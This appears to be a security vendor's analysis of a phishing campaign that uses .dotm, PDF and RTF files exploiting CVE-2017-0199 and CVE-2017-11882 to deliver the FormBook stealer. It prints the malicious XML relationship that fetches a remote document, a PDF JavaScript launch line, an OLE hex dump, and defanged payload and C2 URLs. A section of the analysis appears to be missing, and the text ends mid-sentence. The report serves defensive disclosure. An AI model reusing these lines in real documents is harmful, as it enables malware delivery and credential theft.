FormBook is\nan inexpensive stealer available as \"malware as a service.\" This means an attacker can\npurchase a compiled piece of malware based on their desired parameters. This is\ncommonplace with crimeware and stealer type malware such as FormBook. It is able to\nrecord keystrokes, steal passwords (stored locally and in web forms) and can take\nscreenshots.\n\nThe author put a lot of effort in the infection vector using multiple malicious documents in a\nsingle phishing email. The author also mixed different file formats (PDF and Microsoft Office\ndocument) and used two public Microsoft Office exploits (CVE-2017-0199 and CVE-201711882) in order to drop the final payload on the targeted system. The final payload was\ndownloaded during the campaign from a small Japanese file-sharing platform (hosted in\nNetherland). The platform owner has since deleted the malicious payload binaries from their\nsystem. Here is the infection workflow:\n\n\n-----\n\nWe identified an infrastructure overlap between this campaign and a previous campaign we\n[published in February 2017 relating to Pony malware which utilized Microsoft Publisher files](https://blog.talosintelligence.com/2017/02/pony-pub-files.html)\nto deliver its payload. There is the potential that the same actor behind these two attacks is\nthe same due to an overlap in the two attacks' infrastructure. If that is the case, the actor\ncould switch between Pony and FormBook to be able to continue their malicious activities for\nmore than a year.\n\n## Infection Vector\n\n### Phishing Campaign\n\n\n-----\n\nThis campaign starts with a malicious email containing two attachments. Here is a snippet of\nthe email:\n\nThe email pretends to be an order sent from the sales department of a company located in\nSpain. The website's details and phone number appear to have been copied from that of a\ngenuine company.\n\nThe email contains two attachments:\n\nA blank malicious Microsoft Office document template file. (.dotm)\nA malicious PDF document that is also blank. (.pdf)\n\n### First Office MalDoc (Attached)\n\nThe email contains two attachments as mentioned. One of these is a Microsoft Office\ndocument template file. This file type is normally used to share templates. The 'normal.dotm'\nfile is the default Microsoft Word template that opens when Word is launched. The attacker,\nhowever, does not use the .dotm file format to share templates, but rather to download an\nadditional Office document.\n\nIf an example document from the campaign, named \"STMORDER-442799.dotm,\" is opened,\nit appears blank. However, like most Office documents, if the file is unzipped and opened,\nyou can access the attributes and XML information. This is where the attacker leverages\nCVE-2017-0199 to trigger an external download by abusing the relationship elements within\n\n\n-----\n\nSTMORDER-442799\\word\\_rels\\document.xml.rels. Despite the file appearing to be blank,\nit does contain a large amount of XML information. We see the <Relationship> elements\nbeing abused:\n```\n<Relationship Id=\"_id_2970\"\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\"\nTargetMode=\"External\" Target=\"hxxps://pomf[.]pyonpyon[.]moe/cgcvsc.doc\"/>\n</Relationships>\n\n```\nThis will cause the following document to be downloaded and executed from a Japanese filehosting platform.\n\nAt the time of publishing, this file is no longer available and trying to view it results in a 404\nerror. The platform maintainer of PyonPyon.moe provides a list of malware that has been\n[removed from the hosting platform — this can be found here. Within this data, we can](https://pomf.pyonpyon.moe/malware.txt)\nidentify our attempted download of the .doc file, among others related to this campaign,\nwhich were removed on the same day, June 8:\n\n\n-----\n\nWe were able to obtain multiple .doc files in relation to this campaign, which we will discuss\nlater on. These .doc files are in rich text format (RTF), which leveraged CVE-2017-11882.\n\n### PDF document (Attached)\n\nAlso, attached to the initial email is a PDF file which contains a JavaScript object:\n```\nthis.exportDataObject({ cName: \"mine001.dotm\", nLaunch: 2 });\n\n```\nThis code launches a file embedded within the PDF document. In our case, the file is an\nOffice document named \"mine001.dotm.\"\n\n### Second Office MalDoc (Embedded)\n\n\n-----\n\nThe embedded Office document is exactly the same as the attached document discussed\nabove. We don't know why the author of this campaign puts the same file in two seperate\nlocations, or if it's on purpose or a mistake made during the phishing generation stage. It's\npossible the actor did not intend to attach both the DOTM and the PDF.\n\n### Third Office MalDoc (Downloaded)\n\nThe final malicious Office document is an RTF document. This RTF document contains an\nobject linking and embedding (OLE) stream at the offset 0x9F (header d0 cf 11 e0 a1 b1 1a\ne1):\n```\n00000040 36 39 30 36 64 30 34 33 30 32 30 30 30 30 30 30 |6906d04302000000|\n00000050 31 37 30 30 30 30 30 30 37 32 34 37 35 35 33 30 |1700000072475530|\n00000060 33 32 37 37 34 65 37 35 36 64 37 36 33 36 34 66 |32774e756d76364f|\n00000070 35 30 36 66 36 32 34 62 37 34 35 38 34 37 33 32 |506f624b74584732|\n00000080 37 36 35 31 30 30 30 30 30 30 30 30 30 30 30 30 |7651000000000000|\n00000090 30 30 30 30 30 30 30 30 31 30 30 30 30 30 64 30 |00000000100000d0|\n000000a0 63 66 31 31 65 30 61 31 62 31 31 61 65 31 30 30 |cf11e0a1b11ae100|\n000000b0 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 |0000000000000000|\n000000c0 30 30 30 30 30 30 30 30 30 30 30 30 30 30 33 65 |000000000000003e|\n000000d0 30 30 30 33 30 30 66 65 66 66 30 39 30 30 30 36 |000300feff090006|\n000000e0 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 |0000000000000000|\n000000f0 30 30 30 30 30 30 30 31 30 30 30 30 30 30 30 31 |0000000100000001|\n00000100 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 |0000000000000000|\n\n```\nWe have the beginning of the OLE compound file (CF) — named OLECF — object.\n\nThis OLECF object contains a compound file binary format (CFBF) object.This file format is\n[described here.

The malware author stored many PE32 files on this server,\nsome of which are still available. We have included more than 30 hashes of files stored on\nthis server in the IOCs section. The most recent samples are FormBook samples.\n\n\n-----\n\nFormBook is an inexpensive stealer available as malware as a service. It is able to record\nkeystrokes, steal passwords (stored locally and in web forms) and can take screenshots.\nThis post does not describe the malware in-depth, since there are excellent posts on the\nmalware written by other researchers.\n\n## Overlaps with previous campaigns\n\nIn [February 2017, we published an article about another stealer using Publisher and a public](https://blog.talosintelligence.com/2017/02/pony-pub-files.html)\nexploit to compromise systems. We found three interesting samples related to this case and\nour current FormBook case:\n\n5aac259cb807a4c8e4986dbc1354ef566a12ced381b702a96474c0f8ff45f825 (located\nat hxxp://irishlebanese[.]com/wp-admin/admin/dor001.exe in May 2018)\n82ce499994e4b2ee46e887946ef43f18b046639e81dfe1d23537ce6a530d8794 (located\nat hxxp://irishlebanese[.]com/wp-admin/admin/mine001.exe in May 2018)\n8f6813634cb08d6df72e045294bf63732c0753f79293f1c9b2765f686f699a72 (located at\nhxxp://irishlebanese[.]com/wp-admin/admin/mine001.exe in May 2018)\n\nThese three samples use the same FormBook infrastructure and the Pony infrastructure\nmentioned in our previous article:\n\nhxxp://alphastand[.]top/alien/fre.php -> command and control (C2) server from 2017\nhxxp://ukonlinejfk[.]ru/mine/fre.php\nhxxp://alphastand[.]trade/alien/fre.php -> C2 server from 2017\nhxxp://igtckeep[.]com/dor/fre.php\nhxxp://alphastand[.]win/alien/fre.php -> C2 server from 2017\nhxxp://kbfvzoboss[.]bid/alien/fre.php -> C2 server from 2017\nhxxp://www.cretezzy[.]com/do/ -> FormBook C2 server\nhxxp://www.beemptty[.]com/se/ -> FormBook C2 server\n\nThe infrastructure sharing suggests that this is a common actor currently using two different\nstealers. Based on the timeline, we assume that the actor is currently moving from Pony to\nFormBook, another stealer.\n\n## Conclusion\n\nThis case shows us that malicious actors play with multiple file formats and embedded\nobjects. In this campaign, the author used a PDF with an embedded Office document\ntemplate using a vulnerability in order to download an additional Office RTF document, and\nthen a second vulnerability and exploit in order to compromise the target. The attacker used\nan unfamiliar file-sharing platform in order to store the malicious document and a\n\n\n-----\n\ncompromised WordPress site in order to store the final payload. We did notice that the filesharing platform is reactive, removing the malicious files quickly, stopping the infection chain.\n\nSome technical elements, such as infrastructure sharing, show us that the actor behind this\ncampaign is probably the same actor behind a campaign we described one year ago. Last\nmonth it used two stealers in parallel on the same infrastructure. Based on the information\nwe have today, he/she no longer uses Pony, but switched to FormBook in order to steal\ninformation on compromised systems.\n\n## Coverage\n\nAdditional ways our customers can
